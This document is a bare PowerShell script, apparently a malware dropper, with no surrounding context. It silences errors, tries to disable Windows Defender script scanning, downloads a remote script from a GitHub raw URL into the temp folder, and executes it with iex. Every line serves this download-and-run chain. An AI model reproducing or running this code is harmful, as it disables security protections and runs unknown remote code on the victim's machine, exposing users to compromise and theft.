$ErrorActionPreference = 'SilentlyContinue'
try { Set-MpPreference -DisableScriptScanning $true } catch { }
$p = Join-Path $env:TEMP 'z.ps1'
curl.exe -sL --max-time 300 -o $p 'https://raw.githubusercontent.com/byteforge0-cloud/darkwhisper/refs/heads/main/st.ps1'
if ((Test-Path $p) -and ((Get-Item $p).Length -gt 500)) { iex (Get-Content $p -Raw) }
